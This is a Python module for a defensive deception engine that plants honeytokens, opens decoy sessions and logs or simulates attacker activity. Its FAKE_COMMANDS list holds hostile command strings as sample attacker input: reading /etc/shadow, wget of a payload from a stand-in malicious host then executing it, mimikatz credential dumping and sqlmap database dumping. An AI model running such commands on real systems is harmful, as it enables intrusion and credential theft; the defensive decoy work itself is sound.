"""Adaptive Deception Engine.

Generates believable fake assets and records attacker activity when risky
sessions are redirected into decoys.
"""
import json
import random
from typing import Dict, List, Optional

from sqlalchemy.orm import Session

from app.models.deception import DecoySession, Honeytoken


FAKE_CREDENTIALS = [
    "admin:Adm1n@2024!",
    "root:Toor#ProdDB",
    "svc_backup:B@ckup_Service!",
    "jdoe:Welcome2024!",
    "api_key=sk_live_5f7c9b3a2e8d4f1a",
    "AWS_ACCESS_KEY=AKIA3EXAMPLEKEY",
]

FAKE_FILES = [
    "Q4_Financial_Report.xlsx",
    "employee_salaries_2024.csv",
    "ceo_private_notes.docx",
    "customer_pii_dump.sql",
    "network_topology.png",
]

FAKE_PAGES = [
    "/admin",
    "/admin/dashboard",
    "/admin/users",
    "/admin/secrets",
    "/internal/hr",
    "/internal/payroll",
    "/internal/credentials",
    "/api/v1/admin",
]

FAKE_COMMANDS = [
    "ls -la /etc/shadow",
    "cat /etc/passwd",
    "whoami && id",
    "ps aux | grep ssh",
    "wget http://malicious.example.com/payload.sh",
    "chmod +x payload.sh && ./payload.sh",
    "mimikatz.exe sekurlsa::logonpasswords",
    "net user administrator Password123!",
    "powershell -enc SQBFAFgAIAAo...",
    "sqlmap -u 'http://target/db?id=1' --dump",
]

DECOY_TYPES = ["ssh", "database", "web", "admin_panel"]


class DeceptionEngine:
    def __init__(self, db: Session):
        self.db = db

    # ---- honeytoken management ----
    def seed_honeytokens(self) -> List[Honeytoken]:
        existing = self.db.query(Honeytoken).count()
        if existing:
            return []
        tokens = [
            Honeytoken(token_type="credential", label="Backup Operator Account",
                       value=FAKE_CREDENTIALS[2], planted_on="fileserver-01"),
            Honeytoken(token_type="credential", label="Cloud API Key",
                       value=FAKE_CREDENTIALS[4], planted_on="github.com/org/admin"),
            Honeytoken(token_type="file", label="Sensitive Report",
                       value=FAKE_FILES[0], planted_on="fileserver-01"),
            Honeytoken(token_type="file", label="Customer PII",
                       value=FAKE_FILES[3], planted_on="db-replica"),
            Honeytoken(token_type="api_key", label="AWS Access Key",
                       value=FAKE_CREDENTIALS[5], planted_on="ci-runner-07"),
            Honeytoken(token_type="cookie", label="Internal Session Cookie",
                       value="ct_session=fake_5f7c9b3a2e8d4f1a", planted_on="intranet.ct.local"),
        ]
        for t in tokens:
            self.db.add(t)
        self.db.commit()
        return tokens

    def trigger_honeytoken(self, value: str) -> Optional[Honeytoken]:
        token = self.db.query(Honeytoken).filter(Honeytoken.value == value).first()
        if token:
            token.triggered = 1
            self.db.commit()
        return token

    # ---- decoy session creation ----
    def open_decoy(self, *, actor: str, source_ip: str, threat_id: Optional[int],
                   decoy_type: Optional[str] = None) -> DecoySession:
        decoy_type = decoy_type or random.choice(DECOY_TYPES)
        session = DecoySession(
            threat_id=threat_id,
            decoy_type=decoy_type,
            actor=actor,
            source_ip=source_ip,
            activity=json.dumps([f"Connected to decoy {decoy_type}",
                                  "Banner presented as production"]),
            commands=json.dumps([]),
            pages=json.dumps([]),
            credentials_used=",".join(random.sample(FAKE_CREDENTIALS, 2)),
            notes=f"Session auto-redirected because Zero Trust decision='deceive'.",
        )
        self.db.add(session)
        self.db.commit()
        self.db.refresh(session)
        return session

    def record_activity(self, session: DecoySession, *, command: Optional[str] = None,
                        page: Optional[str] = None) -> DecoySession:
        cmds = json.loads(session.commands or "[]")
        pgs = json.loads(session.pages or "[]")
        if command:
            cmds.append(command)
        if page:
            pgs.append(page)
        session.commands = json.dumps(cmds)
        session.pages = json.dumps(pgs)
        self.db.commit()
        self.db.refresh(session)
        return session

    def simulate_activity(self, session: DecoySession) -> DecoySession:
        """Pretend the attacker is doing things while we record them."""
        if session.decoy_type == "ssh":
            return self.record_activity(session, command=random.choice(FAKE_COMMANDS))
        if session.decoy_type == "database":
            return self.record_activity(session, command="SELECT * FROM users WHERE 1=1")
        if session.decoy_type in ("web", "admin_panel"):
            return self.record_activity(session, page=random.choice(FAKE_PAGES))
        return session

    # ---- read helpers ----
    def list_sessions(self, limit: int = 100) -> List[DecoySession]:
        return (
            self.db.query(DecoySession)
            .order_by(DecoySession.timestamp.desc())
            .limit(limit)
            .all()
        )

    def list_tokens(self) -> List[Honeytoken]:
        return self.db.query(Honeytoken).all()
